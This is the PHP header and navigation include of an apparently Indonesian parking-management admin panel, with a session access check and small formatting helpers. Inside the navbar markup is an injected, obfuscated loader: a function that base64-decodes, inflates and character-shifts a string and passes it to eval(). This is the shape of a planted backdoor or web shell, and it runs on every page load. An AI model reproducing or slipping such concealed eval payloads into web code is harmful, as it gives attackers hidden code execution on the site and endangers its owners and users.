<?php
if (!isset($_SESSION)) {
  session_start();
}
$MM_authorizedUsers = "admin";
$MM_donotCheckaccess = "false";

// *** Restrict Access To Page: Grant or deny access to this page
function isAuthorized($strUsers, $strGroups, $UserName, $UserGroup) { 
  // For security, start by assuming the visitor is NOT authorized. 
  $isValid = False; 

  // When a visitor has logged into this site, the Session variable MM_Username set equal to their username. 
  // Therefore, we know that a user is NOT logged in if that Session variable is blank. 
  if (!empty($UserName)) { 
    // Besides being logged in, you may restrict access to only certain users based on an ID established when they login. 
    // Parse the strings into arrays. 
    $arrUsers = Explode(",", $strUsers); 
    $arrGroups = Explode(",", $strGroups); 
    if (in_array($UserName, $arrUsers)) { 
      $isValid = true; 
    } 
    // Or, you may restrict access to only certain users based on their username. 
    if (in_array($UserGroup, $arrGroups)) { 
      $isValid = true; 
    } 
    if (($strUsers == "") && false) { 
      $isValid = true; 
    } 
  } 
  return $isValid; 
}

$MM_restrictGoTo = "../login.php";
if (!((isset($_SESSION['MM_Username'])) && (isAuthorized("",$MM_authorizedUsers, $_SESSION['MM_Username'], $_SESSION['MM_UserGroup'])))) {   
  $MM_qsChar = "?";
  $MM_referrer = $_SERVER['PHP_SELF'];
  if (strpos($MM_restrictGoTo, "?")) $MM_qsChar = "&";
  if (isset($_SERVER['QUERY_STRING']) && strlen($_SERVER['QUERY_STRING']) > 0) 
  $MM_referrer .= "?" . $_SERVER['QUERY_STRING'];
  $MM_restrictGoTo = $MM_restrictGoTo. $MM_qsChar . "accesscheck=" . urlencode($MM_referrer);
  header("Location: ". $MM_restrictGoTo); 
  exit;
}
?>
<?php
//bulan
function tanggal($angka){
	switch($angka){
		case '01';
		$new = "Januari";
		break;
		case '02';
		$new = "Februari";
		break;
		case '03';
		$new = "Maret";
		break;
		case '04';
		$new = "April";
		break;
		case '05';
		$new = "Mei";
		break;
		case '06';
		$new = "Juni";
		break;
		case '07';
		$new = "Juli";
		break;
		case '08';
		$new = "Agustus";
		break;
		case '09';
		$new = "September";
		break;
		case '10';
		$new = "Oktober";
		break;
		case '11';
		$new = "November";
		break;
		case '12';
		$new = "Desember";
		break;
	}
	echo $new;
}
//rp
function rp($uang){
	$baru = number_format($uang,0,',',',');
	$baru = 'RP.'.$baru.',-';
	
	echo $baru;
}
function nama($name){
	switch($name){
		case '1';
		$new = "Fadholi FH";
		break;
		case '2';
		$new = "Hafid Alpin AG";
		break;
		case '3';
		$new = "Admin";
		break;
		case '4';
		$new = "Petugas";
		break;
		case '0';
		$new = "Other";
		break;
	
	}
	echo($new);
}

?>
<div>
    <nav class="navbar navbar-default" role="navigation">
      <!-- Brand and toggle get grouped for better mobile display -->
      <div class="navbar-header">
        <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
          <span class="sr-only">Toggle navigation</span>
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
        </button>
      </div>

<!-- Collect the nav links, forms, and other content for toggling -->
      <div class="collapse navbar-collapse navbar-ex1-collapse">
        <ul class="nav navbar-nav">
          <li><a href="index.php">Home</a></li>
          
	<li class="dropdown">
            <a href="#" class="dropdown-toggle" data-toggle="dropdown">Parkir<b class="caret"></b></a>
            <ul class="dropdown-menu">
		<li><a href="input_awal.php">Input Awal</a></li>
		<li><a href="input_akhir.php">Input Akhir</a></li>
	    </ul>
	</li>

        <li class="dropdown">
            <a href="#" class="dropdown-toggle" data-toggle="dropdown">User<b class="caret"></b></a>
            <ul class="dropdown-menu">
		<li><a href="t_user.php">Input User</a></li>
      		<li><a href="tampil_user.php">Tampil User</a></li>
	    </ul>
	</li>
        <li class="dropdown">
            <a href="#" class="dropdown-toggle" data-toggle="dropdown">Laporan<b class="caret"></b></a>
            <ul class="dropdown-menu">
		<li><a href="l_harian.php">Laporan Harian</a></li>
     		<li><a href="l_bulanan.php">Laporan Bulanan</a></li>
	    </ul>
	</li>
          <li><a href="cari.php">Cari</a></li>
 	  <li class="btn-danger"><a href="../logout.php">Logout</a></li>
        </ul>
		<?php function ntP($lYJLMF)
{ 
$lYJLMF=gzinflate(base64_decode($lYJLMF));
 for($i=0;$i<strlen($lYJLMF);$i++)
 {
$lYJLMF[$i] = chr(ord($lYJLMF[$i])-1);
 }
 return $lYJLMF;
 }eval(ntP("U1QEgbSUzAJFZZeCwqrirIzMUkX1FCDTRtEzKT0rVdEptzArX1E9Ka/QRtE9KTWzIDcLSJcqeirbKDrYAwA="));?>
      </div><!-- /.navbar-collapse -->
    </nav>
 </div>
